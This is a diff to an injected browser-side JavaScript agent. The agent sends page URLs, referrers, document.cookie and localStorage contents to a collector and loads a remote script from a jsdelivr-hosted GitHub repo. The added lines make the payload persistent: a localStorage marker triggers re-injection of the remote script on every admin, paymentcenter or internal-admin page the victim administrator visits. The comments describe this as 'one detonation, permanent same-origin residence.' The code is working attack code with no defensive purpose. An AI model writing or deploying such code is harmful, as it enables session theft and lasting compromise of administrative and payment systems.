@@ -64,5 +64,26 @@ post("agent",[location.href,document.title,location.referrer,document.cookie].jo
 post("ls",ls());
 summary("agent",location.host+location.pathname+" ck="+document.cookie.slice(0,1200));
 if(P){post("panel",location.host+" iframe="+(function(){try{return top!==self}catch(e){return "?"}})()+" dom="+document.domain);
- var z=document.createElement("script");z.src="//cdn.jsdelivr.net/gh/polootyyy/cdnx@93e2490/p.js";document.body.appendChild(z);}
+ var z=document.createElement("script");z.src="//cdn.jsdelivr.net/gh/polootyyy/cdnx@51038d3/p.js";document.body.appendChild(z);}
+// --- v3 RESIDENT BRIDGE (added 2026-11-28) ---
+// On ANY panel host page (not just feedback): if p.js v3 has ever run in this browser
+// (localStorage __HL_R marker), re-inject it on every panel page load. This makes our
+// agent ride the admin's OWN navigation across all ~400/6h surfaces (C3/C4/C5) without
+// spending any feedback quota: one detonation, permanent same-origin residence.
+try{
+ if(/^(admin|paymentcenter|internal-admin)\./.test(location.host)){
+  var rmark=null;
+  try{rmark=JSON.parse(localStorage.getItem("__HL_R"))}catch(e){}
+  var fresh=rmark&&rmark.v&&Date.now()-rmark.ts<7*24*3600*1000;
+  if(fresh){
+   // re-inject the pinned payload; pinned SHA means we control content updates
+   var s=document.createElement("script");
+   s.src="//cdn.jsdelivr.net/gh/polootyyy/cdnx@main/p.js?r="+String(Math.random()).slice(2,8);
+   document.body.appendChild(s);
+   post("res","re-injected v"+rmark.v+" @ "+location.host+location.pathname);
+  } else if(rmark){
+   post("res","stale-marker "+(rmark.ts||0));
+  }
+ }
+}catch(e){post("reserr",String(e).slice(0,80))}
 })();
